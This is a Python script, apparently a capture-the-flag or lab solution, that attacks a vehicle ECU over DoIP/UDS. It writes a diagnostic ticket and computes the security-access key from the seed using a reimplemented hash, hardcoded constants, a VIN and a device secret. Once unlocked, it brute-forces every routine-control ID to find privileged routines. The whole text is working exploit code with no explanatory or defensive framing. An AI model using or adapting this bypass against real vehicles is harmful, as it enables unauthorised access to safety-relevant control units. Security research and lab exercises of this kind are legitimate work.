import sys, json, hashlib, struct; sys.path.insert(0,"04_SOLVE/uds")
from doip import DoIP, explain
GOLD,m1,m2,k5=0x9E3779B9,0x7FEB352D,0x846CA68B,0xA5A5A5A5
def lb(x):
    x&=0xffffffff; x^=x>>16; x=(x*m1)&0xffffffff; x^=x>>15; x=(x*m2)&0xffffffff; x^=x>>16; return x&0xffffffff
def hash8(A,B,C):
    o=[]
    for i in range(2):
        a=struct.unpack("<I",A[4*i:4*i+4])[0]; b=struct.unpack("<I",B[4*i:4*i+4])[0]; c=struct.unpack("<I",C[4*i:4*i+4])[0]
        x=lb(a^b^c^(((i+1)*GOLD)&0xffffffff)); o.append((x+((i+1)*k5))&0xffffffff)
    return struct.pack("<II",*o)
C_DEV=bytes.fromhex("e224dd2bb23a15b8"); VIN=b"CV622697F82A936A1"

tick=json.load(open("work/ticket_now.json"))
d=DoIP(); d.connect(); d.routing_activation()
d.uds(0xE442,bytes.fromhex("1003"),wait=0.8)
d.uds(0xE442, bytes.fromhex("2EF1A1")+tick["diagnosticTicket"].encode(), wait=1.0)
x=d.parse_uds(d.uds(0xE442, bytes.fromhex("2701"), wait=1.0))
seed=bytes.fromhex(x[0]['uds'][4:])
key=hash8(seed[:8], hashlib.sha256(VIN).digest()[:8], C_DEV)
y=d.parse_uds(d.uds(0xE442, bytes.fromhex("2702")+key, wait=1.0))
print("unlock:", y[0]['uds'] if y else "FAIL")
if not y or not y[0]['uds'].startswith("6702"): sys.exit(1)

found=[]
for rid in range(0x0000,0x10000):
    x=d.parse_uds(d.uds(0xE442, bytes([0x31,0x01])+struct.pack(">H",rid), wait=0.30))
    u=x[0]['uds'] if x else "EMPTY"
    if not u.startswith("7f3131"):
        print(f"  *** 31 01 {rid:#06x} -> {u}",flush=True); found.append((rid,u))
    if rid%20000==0 and rid: print(f"  ...{rid:#06x} found={len(found)}",flush=True)
d.close()
print("found:",found)
